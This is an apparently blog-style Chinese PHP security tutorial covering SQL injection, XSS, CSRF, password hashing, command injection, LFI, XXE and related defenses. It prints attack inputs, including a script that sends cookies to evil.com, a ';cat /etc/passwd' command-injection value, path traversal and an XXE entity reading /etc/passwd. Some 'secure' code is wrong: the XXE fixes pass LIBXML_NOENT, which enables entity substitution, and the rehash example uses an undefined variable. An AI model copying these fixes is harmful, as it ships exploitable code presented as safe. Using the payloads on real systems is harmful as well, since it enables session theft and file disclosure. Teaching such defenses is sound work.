---

title: PHP 安全防护：XSS、SQL 注入、CSRF 与文件上传漏洞
keywords: [PHP, XSS, SQL, CSRF, 安全防护, 注入, 与文件上传漏洞]
cover: https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop
images:
  - https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop
tags:
- PHP
- 安全
categories:
- php
date: 2019-03-20 15:05:07
description: 全面解析PHP安全常见漏洞与防范策略，涵盖SQL注入、XSS、CSRF、密码哈希、命令注入、XXE等十大安全问题，提供PDO预处理、htmlspecialchars、bcrypt、Laravel CSRF Token等实战代码示例与最佳实践清单，助你构建安全可靠的PHP应用。
---





## 永远不要相信用户传递的任何数据

Web 安全是每一个 PHP 开发者必须重视的课题。无论应用规模大小，忽视安全问题都可能导致数据泄露、服务器被入侵甚至法律纠纷。本文将系统梳理 PHP 开发中最常见的十大安全漏洞，逐一讲解其原理、危害、攻击方式，并提供可运行的代码示例和防范方案。

## 安全问题总览

|       安全问题       |                      释义                      |                           防范                           |
| :------------------: | :--------------------------------------------: | :------------------------------------------------------: |
|       SQL注入        |    攻击者通过注入恶意SQL语句操控数据库查询     |         使用 PDO 预处理语句、参数化查询、ORM              |
|   XSS跨站脚本攻击    |   在页面中注入恶意脚本，在用户浏览器中执行     |       htmlspecialchars 转义、CSP 头、输出编码             |
| XSRF跨站请求伪造攻击 |  利用用户已登录状态，伪造请求执行非授权操作    |       CSRF Token、SameSite Cookie、验证 Referer          |
|   不充分的密码哈希   | 使用弱哈希算法存储密码，易被暴力破解或彩虹表  |       使用 password_hash() + bcrypt/Argon2               |
|  生产中打印错误日志  | 错误信息直接输出到页面，泄露服务器内部信息     |       关闭 display_errors、使用 Monolog 结构化日志       |
|      登录未限制      | 登录接口无频率限制，易遭暴力破解攻击          |       速率限制、账号锁定、验证码（CAPTCHA）              |
|      中间人攻击      | 通信被截获和篡改，数据在传输过程中被窃取       |       强制 HTTPS、HSTS 头、证书固定                      |
|       命令注入       | 通过用户输入注入系统命令，远程执行任意代码     |       escapeshellarg()、escapeshellcmd()、白名单校验     |
|         LFI          | 通过文件包含漏洞读取服务器上的敏感文件         |       白名单文件映射、open_basedir、禁止用户控制路径     |
|         XXE          | 解析恶意 XML 时加载外部实体，导致信息泄露或 SSRF |       禁用外部实体加载、使用安全的 XML 解析配置         |

---

## 1. SQL 注入（SQL Injection）

### 原理与危害

SQL 注入是最经典的 Web 安全漏洞之一。当应用程序将用户输入直接拼接到 SQL 查询字符串中时，攻击者可以构造恶意输入来改变 SQL 语句的逻辑，从而实现：

- 绕过登录认证
- 读取、修改、删除数据库中的数据
- 执行数据库管理操作（如 `DROP TABLE`）
- 在某些数据库上执行操作系统命令

### 攻击示例

```php
// ❌ 危险：直接拼接用户输入
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $pdo->query($sql);
```

攻击者输入 `username = admin' --`，SQL 变为：

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

`--` 注释掉了密码验证，攻击者无需密码即可登录。

### 防范：使用 PDO 预处理语句

```php
// ✅ 安全：使用预处理语句和参数绑定
$pdo = new PDO(
    'mysql:host=localhost;dbname=myapp;charset=utf8mb4',
    'db_user',
    'db_password',
    [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES => false, // 关闭模拟预处理，使用真正的预处理
    ]
);

$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
$stmt->execute([
    ':username' => $_POST['username'],
    ':password' => $_POST['password'],
]);
$user = $stmt->fetch();
```

预处理语句将 SQL 结构与数据分离，数据库引擎会将参数值视为纯数据而非 SQL 的一部分，从根本上杜绝了 SQL 注入。

### 使用 Laravel Eloquent 的安全写法

```php
// ✅ Laravel 中使用参数绑定
$user = User::where('username', $request->input('username'))
    ->where('password', $request->input('password'))
    ->first();

// ✅ 使用查询构建器
DB::table('users')
    ->where('email', '=', $email)
    ->get();
```

> **关键原则**：永远不要将用户输入直接拼接到 SQL 字符串中。始终使用预处理语句或 ORM。

---

## 2. XSS 跨站脚本攻击（Cross-Site Scripting）

### 原理与危害

XSS 攻击是指攻击者将恶意脚本（通常是 JavaScript）注入到网页中，当其他用户访问该页面时，恶意脚本在受害者浏览器中执行。攻击者可以：

- 窃取用户的 Cookie 和会话信息
- 伪造用户操作（如转账、发帖）
- 重定向用户到钓鱼网站
- 记录用户键盘输入

### 三种类型

1. **存储型 XSS**：恶意脚本存储在服务器数据库中（如评论区），所有访问者都会受到影响
2. **反射型 XSS**：恶意脚本通过 URL 参数反射到页面中
3. **DOM 型 XSS**：通过修改页面 DOM 结构实现攻击

### 攻击示例

```php
// ❌ 危险：直接输出用户输入
echo "欢迎, " . $_GET['name'];

// 如果访问 ?name=<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>
// 攻击者即可窃取用户 Cookie
```

### 防范：输出转义与 CSP

```php
// ✅ 安全：使用 htmlspecialchars 进行输出转义
echo "欢迎, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

// ✅ 封装通用的转义函数
function e(string $value): string
{
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

// 使用
echo '<p>用户名：' . e($user['name']) . '</p>';
echo '<p>个人简介：' . e($user['bio']) . '</p>';
```

### 设置 Content Security Policy (CSP) 头

```php
// ✅ 在入口文件或中间件中设置 CSP 头
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-" . $nonce . "'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
```

### 在 Laravel Blade 模板中

```php
// ✅ Blade 模板默认使用 {!! !!} 和 {{ }} 的区别
{{ $variable }}     // 自动转义，安全
{!! $variable !!}   // 不转义，仅用于可信 HTML

// ❌ 绝不要这样做
{!! $_GET['user_input'] !!}
```

> **关键原则**：所有输出到 HTML 的动态数据都必须经过转义。结合 CSP 头进一步限制脚本执行来源。

---

## 3. XSRF 跨站请求伪造攻击（Cross-Site Request Forgery）

### 原理与危害

CSRF 攻击利用用户已登录的身份，在用户不知情的情况下，以用户身份发送恶意请求。例如，攻击者可以构造一个隐藏表单或图片标签，当已登录用户访问攻击者控制的页面时，浏览器会自动带上用户的 Cookie 发出请求。

### 攻击示例

```html
<!-- ❌ 攻击者控制的页面 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">
<!-- 用户访问此页面时，浏览器会自动带上 bank.com 的 Cookie，触发转账 -->
```

### 防范：CSRF Token

```php
// ✅ 手动实现 CSRF Token

// 1. 生成 Token 并存入 Session
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 2. 在表单中嵌入 Token
echo '<form method="POST" action="/transfer">';
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
echo '<input type="text" name="amount">';
echo '<button type="submit">转账</button>';
echo '</form>';

// 3. 验证 Token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    http_response_code(403);
    die('CSRF 验证失败');
}
```

### Laravel 中的 CSRF 保护

```php
// ✅ Laravel 内置了完善的 CSRF 保护机制

// routes/web.php - 自动应用 CSRF 中间件
Route::post('/transfer', [TransferController::class, 'store']);

// Blade 模板中
// <form method="POST" action="/transfer">
//     @csrf
//     <input type="text" name="amount">
//     <button type="submit">转账</button>
// </form>
```

### SameSite Cookie 属性

```php
// ✅ 设置 SameSite Cookie 属性，防止跨站请求携带 Cookie
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,      // 仅通过 HTTPS 传输
    'httponly' => true,     // 禁止 JavaScript 访问
    'samesite' => 'Lax',   // 限制跨站发送 Cookie
]);
session_start();
```

`SameSite` 的三个值：
- **Strict**：完全禁止跨站携带 Cookie
- **Lax**：允许顶级导航的 GET 请求携带 Cookie（推荐默认值）
- **None**：允许跨站携带 Cookie（必须同时设置 `Secure`）

> **关键原则**：所有修改数据的 POST/PUT/DELETE 请求都必须验证 CSRF Token。配合 SameSite Cookie 使用。

---

## 4. 不充分的密码哈希（Insufficient Password Hashing）

### 原理与危害

许多开发者仍然使用 MD5 或 SHA1 等通用哈希算法存储密码。这些算法设计初衷是快速计算，而非安全存储。一旦数据库泄露，攻击者可以利用彩虹表或 GPU 暴力破解在短时间内还原大量密码。

### ❌ 常见错误做法

```php
// ❌ 绝对不要这样做
$hashedPassword = md5($password);           // 无盐值，彩虹表秒破
$hashedPassword = sha1($password);          // 同上
$hashedPassword = md5($password . $salt);   // 自定义盐值不够随机
```

### ✅ 正确做法：使用 password_hash()

```php
// ✅ 注册时：使用 PASSWORD_DEFAULT（当前为 bcrypt）
$hashedPassword = password_hash($password, PASSWORD_DEFAULT);
// 存入数据库：$hashedPassword 格式类似 $2y$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

// ✅ 登录时：使用 password_verify() 验证
$user = getUserByUsername($username);
if ($user && password_verify($inputPassword, $user['password'])) {
    // 登录成功
    echo '登录成功';
} else {
    // 登录失败
    echo '用户名或密码错误';
}
```

### 使用 Argon2id（PHP 7.3+ 推荐）

```php
// ✅ 使用 Argon2id 算法，更适合现代硬件环境
$hashedPassword = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,  // 64 MB 内存消耗
    'time_cost'   => 4,      // 迭代次数
    'threads'     => 3,      // 并行线程数
]);

// 验证方式不变
if (password_verify($inputPassword, $hashedPassword)) {
    echo '登录成功';
}
```

### 检查是否需要重新哈希

```php
// ✅ 当算法或参数升级时，检查现有哈希是否需要更新
if (password_needs_rehash($user['password'], PASSWORD_ARGON2ID)) {
    $newHash = password_hash($newPassword, PASSWORD_ARGON2ID);
    // 更新数据库中的密码哈希
    updateUserPassword($user['id'], $newHash);
}
```

> **关键原则**：始终使用 `password_hash()` 和 `password_verify()`。不要自行实现哈希算法，也不要使用 MD5/SHA1 存储密码。

---

## 5. 生产中打印错误日志（Error Logging in Production）

### 原理与危害

在生产环境中直接显示 PHP 错误信息（包括 `echo`、`print_r`、`var_dump` 和未捕获的异常）会泄露以下敏感信息：

- 服务器文件路径和目录结构
- 数据库连接信息和查询语句
- 第三方服务的 API 密钥
- PHP 版本和扩展信息

### ❌ 危险做法

```php
// ❌ 在生产环境显示详细错误
ini_set('display_errors', '1');
error_reporting(E_ALL);

// ❌ 调试代码残留在生产环境
var_dump($userData);
print_r($databaseConfig);
echo "Debug: SQL = " . $sql;
```

### ✅ 正确做法：使用 Monolog 结构化日志

```php
<?php
// ✅ 使用 Composer 安装：composer require monolog/monolog

use Monolog\Logger;
use Monolog\Handler\StreamHandler;
use Monolog\Handler\FirePHPHandler;
use Monolog\Processor\IntrospectionProcessor;

// 创建日志实例
$log = new Logger('app');
$log->pushHandler(new StreamHandler('/var/log/app/app.log', Logger::WARNING));
$log->pushHandler(new StreamHandler('php://stderr', Logger::DEBUG));
$log->pushProcessor(new IntrospectionProcessor());

// 使用不同的日志级别
$log->debug('调试信息', ['user_id' => 42, 'action' => 'page_view']);
$log->info('用户登录成功', ['user_id' => 42, 'ip' => '192.168.1.1']);
$log->warning('密码尝试次数过多', ['user_id' => 42, 'attempts' => 5]);
$log->error('数据库连接失败', ['exception' => $e->getMessage()]);
$log->critical('支付系统异常', ['order_id' => 12345]);
```

### 生产环境 PHP 配置

```ini
; php.ini 生产环境推荐配置
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/error.log
error_reporting = E_ALL & ~E_DEPRECATED & ~E_STRICT
```

### 敏感数据脱敏

```php
// ✅ 日志中的敏感数据必须脱敏
function maskSensitiveData(array $data): array
{
    $sensitiveKeys = ['password', 'token', 'secret', 'credit_card', 'ssn'];
    $masked = [];
    foreach ($data as $key => $value) {
        if (in_array(strtolower($key), $sensitiveKeys)) {
            $masked[$key] = '***MASKED***';
        } elseif (is_array($value)) {
            $masked[$key] = maskSensitiveData($value);
        } else {
            $masked[$key] = $value;
        }
    }
    return $masked;
}

$log->info('用户注册', maskSensitiveData([
    'username' => 'john',
    'password' => 'mysecretpassword',  // 将被脱敏为 ***MASKED***
    'email' => 'john@example.com',
]));
```

> **关键原则**：生产环境关闭 `display_errors`，所有日志写入文件或日志服务，敏感数据必须脱敏后记录。

---

## 6. 登录未限制（Missing Rate Limiting）

### 原理与危害

如果登录接口没有任何频率限制，攻击者可以使用自动化工具对目标账户进行暴力破解，尝试大量密码组合直到成功。这在弱密码的场景下尤其危险。

### ✅ 基于 Session 的简单速率限制

```php
<?php
session_start();

function checkLoginRateLimit(string $username): bool
{
    $key = 'login_attempts_' . md5($username);
    $maxAttempts = 5;
    $lockoutTime = 900; // 15 分钟

    if (!isset($_SESSION[$key])) {
        $_SESSION[$key] = ['count' => 0, 'first_attempt' => time()];
    }

    $attempts = &$_SESSION[$key];

    // 重置计数器（超过锁定时间后）
    if (time() - $attempts['first_attempt'] > $lockoutTime) {
        $attempts = ['count' => 0, 'first_attempt' => time()];
    }

    if ($attempts['count'] >= $maxAttempts) {
        $remainingTime = $lockoutTime - (time() - $attempts['first_attempt']);
        throw new Exception("登录尝试次数过多，请 {$remainingTime} 秒后重试");
    }

    return true;
}

function recordLoginAttempt(string $username, bool $success): void
{
    $key = 'login_attempts_' . md5($username);
    if ($success) {
        unset($_SESSION[$key]); // 登录成功，清除计数
    } else {
        $_SESSION[$key]['count']++;
    }
}

// 使用示例
try {
    checkLoginRateLimit($username);
    // 验证登录...
    $isValid = verifyPassword($username, $password);
    recordLoginAttempt($username, $isValid);
} catch (Exception $e) {
    echo $e->getMessage();
}
```

### Laravel 内置速率限制

```php
// ✅ Laravel 中使用 Throttle 中间件
// routes/web.php
Route::post('/login', [LoginController::class, 'login'])
    ->middleware('throttle:5,1');  // 每分钟最多 5 次

// ✅ 或在 LoginController 中使用 RateLimiter
use Illuminate\Support\Facades\RateLimiter;

RateLimiter::attempt('login:' . $request->ip(), 5, function () {
    // 处理登录逻辑
}, 60); // 60 秒内最多 5 次
```

### 集成验证码（CAPTCHA）

```php
// ✅ 使用 Google reCAPTCHA v3
function verifyCaptcha(string $token): bool
{
    $secretKey = 'YOUR_RECAPTCHA_SECRET_KEY';
    $response = file_get_contents(
        "https://www.google.com/recaptcha/api/siteverify?secret={$secretKey}&response={$token}"
    );
    $result = json_decode($response, true);
    return $result['success'] && $result['score'] >= 0.5;
}
```

> **关键原则**：登录接口必须有速率限制。结合账号锁定、验证码和密码复杂度要求多层防护。

---

## 7. 中间人攻击（Man-in-the-Middle Attack）

### 原理与危害

中间人攻击（MITM）是指攻击者在客户端和服务器之间的通信链路上截获、篡改数据。在不安全的网络环境中（如公共 Wi-Fi），攻击者可以：

- 窃取用户登录凭据
- 篡改传输中的数据
- 注入恶意内容到响应中
- 劫持用户会话

### ✅ 强制 HTTPS 重定向

```php
// ✅ 在入口文件中强制 HTTPS
if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {
    $redirectUrl = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: ' . $redirectUrl);
    exit;
}
```

### ✅ 设置 HSTS 头

```php
// ✅ HTTP Strict Transport Security
// 告诉浏览器在指定时间内只通过 HTTPS 访问
header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');

// max-age=31536000 表示 1 年
// includeSubDomains 表示包含所有子域名
// preload 表示加入浏览器预加载列表
```

### Nginx 配置示例

```nginx
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers on;

    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
}
```

### PHP 中配置 Cookie 仅通过 HTTPS 传输

```php
// ✅ 所有敏感 Cookie 必须设置 Secure 标志
session_set_cookie_params([
    'secure'   => true,   // 仅 HTTPS
    'httponly' => true,    // 禁止 JS 访问
    'samesite' => 'Lax',
]);
session_start();

// 或在 php.ini 中
// session.cookie_secure = 1
// session.cookie_httponly = 1
// session.cookie_samesite = Lax
```

> **关键原则**：全站强制 HTTPS，启用 HSTS，敏感 Cookie 设置 Secure 标志。使用 TLS 1.2+ 并禁用弱加密套件。

---

## 8. 命令注入（Command Injection）

### 原理与危害

当 PHP 代码使用 `exec()`、`system()`、`shell_exec()`、`passthru()`、`popen()` 等函数执行系统命令，且命令参数包含未经过滤的用户输入时，攻击者可以注入额外的系统命令来执行任意操作。

### 攻击示例

```php
// ❌ 危险：直接将用户输入传入系统命令
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";

// 攻击者访问：?ip=127.0.0.1;cat /etc/passwd
// 实际执行：ping -c 4 127.0.0.1;cat /etc/passwd
```

### ✅ 防范：使用 escapeshellarg() 和白名单

```php
// ✅ 方法一：使用 escapeshellarg() 转义参数
$ip = $_GET['ip'];
$escapedIp = escapeshellarg($ip);
$output = shell_exec("ping -c 4 " . $escapedIp);

// ✅ 方法二：输入白名单验证（推荐）
function isValidIp(string $ip): bool
{
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

$ip = $_GET['ip'] ?? '';
if (!isValidIp($ip)) {
    http_response_code(400);
    die('无效的 IP 地址');
}
$output = shell_exec("ping -c 4 " . escapeshellarg($ip));

// ✅ 方法三：使用 PHP 内置函数替代系统命令
// 不要使用 shell_exec("ping ...")，而是使用 fsockopen 检测端口连通性
function checkPort(string $host, int $port, int $timeout = 3): bool
{
    $connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
    if (is_resource($connection)) {
        fclose($connection);
        return true;
    }
    return false;
}
```

### 使用 escapeshellcmd()

```php
// ✅ escapeshellcmd() 转义整个命令字符串中的特殊字符
$cmd = escapeshellcmd("ls -la " . $userProvidedDirectory);
$output = shell_exec($cmd);

// 注意：escapeshellcmd 转义的是命令中的元字符
// escapeshellarg 转义的是单个参数
// 通常推荐使用 escapeshellarg，因为它更精确
```

> **关键原则**：尽量避免执行系统命令。如果必须使用，始终用 `escapeshellarg()` 处理参数，并进行严格的输入白名单验证。

---

## 9. LFI 本地文件包含（Local File Inclusion）

### 原理与危害

文件包含漏洞发生在应用程序根据用户输入动态加载文件时。攻击者可以利用路径遍历（如 `../../../etc/passwd`）读取服务器上的任意文件，甚至在某些情况下执行恶意代码。

### 攻击示例

```php
// ❌ 危险：用户可控的文件路径
$page = $_GET['page'];
include("/var/www/pages/" . $page . ".php");

// 攻击者访问：?page=../../../etc/passwd%00
// 或利用路径遍历读取敏感文件
```

### ✅ 防范：白名单映射

```php
// ✅ 方法一：白名单映射（最安全）
$allowedPages = [
    'home'     => __DIR__ . '/pages/home.php',
    'about'    => __DIR__ . '/pages/about.php',
    'contact'  => __DIR__ . '/pages/contact.php',
];

$page = $_GET['page'] ?? 'home';
if (!array_key_exists($page, $allowedPages)) {
    http_response_code(404);
    die('页面不存在');
}
include $allowedPages[$page];

// ✅ 方法二：严格路径验证
function safeInclude(string $baseDir, string $requestedFile): void
{
    $realBase = realpath($baseDir);
    $fullPath = realpath($baseDir . '/' . $requestedFile);

    if ($fullPath === false || strpos($fullPath, $realBase) !== 0) {
        throw new RuntimeException('非法文件路径');
    }

    // 额外检查：只允许特定扩展名
    $ext = pathinfo($fullPath, PATHINFO_EXTENSION);
    if (!in_array($ext, ['php', 'html'])) {
        throw new RuntimeException('不允许的文件类型');
    }

    include $fullPath;
}
```

### PHP 配置加固

```ini
; php.ini 安全配置
; 限制文件包含的搜索路径
open_basedir = /var/www/html:/tmp

; 禁止包含远程文件
allow_url_include = Off

; 禁止远程文件打开
allow_url_fopen = Off
```

> **关键原则**：永远不要让用户直接控制文件路径。使用白名单映射或严格的路径验证，并配合 `open_basedir` 限制。

---

## 10. XXE 外部实体注入（XML External Entity）

### 原理与危害

XXE 漏洞出现在应用程序解析用户提供的 XML 数据时，未禁用外部实体加载。攻击者可以利用此漏洞：

- 读取服务器上的任意文件（如 `/etc/passwd`、配置文件）
- 发起 SSRF 攻击，访问内部网络服务
- 导致拒绝服务（如 Billion Laughs 攻击）
- 在某些情况下执行远程代码

### 攻击示例

```xml
<!-- ❌ 恶意 XML 输入 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

### PHP 解析此 XML 的代码

```php
// ❌ 危险：未禁用外部实体的 XML 解析
$xml = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xml);  // 外部实体会被解析，文件内容被读取
```

### ✅ 防范：禁用外部实体

```php
// ✅ 方法一：使用 libxml 禁用外部实体（PHP 8.0+ 默认已禁用）
libxml_disable_entity_loader(true);

$xml = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// ✅ 方法二：使用 SimpleXML 时的安全配置
$xml = simplexml_load_string($xmlString, 'SimpleXMLElement', LIBXML_NOENT);

// ✅ 方法三：使用 XMLReader 进行安全解析（推荐）
$reader = new XMLReader();
$reader->XML($xmlString);
// XMLReader 默认不解析外部实体，更安全

// ✅ 方法四：使用 Symfony 或 Laravel 的安全 XML 解析
// Symfony Serializer 组件默认禁用外部实体
```

### PHP 8.0+ 的改进

```php
// PHP 8.0 开始，libxml_disable_entity_loader() 已被弃用
// 因为 PHP 8.0+ 默认使用 libxml 2.9.0+，已经默认禁用外部实体加载
// 但为了向后兼容，仍然建议显式声明安全选项

$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
```

> **关键原则**：尽量避免接受用户提供的 XML 数据。如果必须解析，禁用外部实体加载和 DTD 处理。PHP 8.0+ 默认已较安全。

---

## PHP 安全最佳实践清单

### 输入验证与输出转义

- [ ] 所有用户输入（`$_GET`、`$_POST`、`$_COOKIE`、`$_REQUEST`、`php://input`）都必须验证
- [ ] 使用白名单验证优于黑名单过滤
- [ ] 输出到 HTML 时使用 `htmlspecialchars()` 转义
- [ ] 输出到 JavaScript 时使用 `json_encode()` 转义
- [ ] 输出到 URL 时使用 `urlencode()` 转义
- [ ] 输出到 SQL 时使用预处理语句

### 认证与授权

- [ ] 使用 `password_hash()` + `PASSWORD_BCRYPT` 或 `PASSWORD_ARGON2ID` 存储密码
- [ ] 使用 `password_verify()` 验证密码
- [ ] 实施登录速率限制和账号锁定机制
- [ ] 使用安全的会话管理（`session_regenerate_id()` 登录后刷新会话 ID）
- [ ] 实施基于角色的访问控制（RBAC）

### 会话安全

- [ ] 设置 `session.cookie_httponly = 1`
- [ ] 设置 `session.cookie_secure = 1`（仅 HTTPS）
- [ ] 设置 `session.cookie_samesite = Lax` 或 `Strict`
- [ ] 登录成功后调用 `session_regenerate_id(true)`
- [ ] 设置合理的会话过期时间

### HTTP 安全头

- [ ] 设置 `Content-Security-Policy` 限制资源加载来源
- [ ] 设置 `X-Content-Type-Options: nosniff` 防止 MIME 类型嗅探
- [ ] 设置 `X-Frame-Options: DENY` 或 `SAMEORIGIN` 防止点击劫持
- [ ] 设置 `Strict-Transport-Security` 强制 HTTPS
- [ ] 设置 `Referrer-Policy` 控制 Referrer 信息泄露
- [ ] 设置 `Permissions-Policy` 限制浏览器功能访问

### 服务器配置

- [ ] 生产环境关闭 `display_errors`，开启 `log_errors`
- [ ] 设置 `expose_php = Off` 隐藏 PHP 版本信息
- [ ] 设置 `open_basedir` 限制文件访问范围
- [ ] 设置 `disable_functions` 禁用危险函数（如 `exec`、`passthru`、`shell_exec`）
- [ ] 保持 PHP 版本和扩展更新到最新稳定版

### 依赖管理

- [ ] 使用 Composer 管理依赖，定期运行 `composer audit`
- [ ] 使用 `roave/security-advisories` 包阻止安装已知漏洞的依赖
- [ ] 定期检查 OWASP Top 10 更新

### 日志与监控

- [ ] 使用结构化日志（如 Monolog）记录安全事件
- [ ] 监控异常登录行为和暴力破解尝试
- [ ] 定期审计日志，设置告警规则
- [ ] 敏感数据写入日志前必须脱敏

### 数据保护

- [ ] 数据库连接使用 SSL/TLS 加密
- [ ] 敏感数据（如 API 密钥）存储在环境变量中，不要硬编码
- [ ] 使用 `random_bytes()` 或 `random_int()` 生成安全随机数
- [ ] 加密敏感数据时使用 `sodium_crypto_*` 或 `openssl_*` 等安全库

---

## 相关阅读

- [PHP OOP 面向对象编程](/categories/PHP/oop/)
- [PHP 代码优化](/categories/PHP/code-optimization/)
- [PHP 依赖注入](/categories/PHP/dependency-injection/)
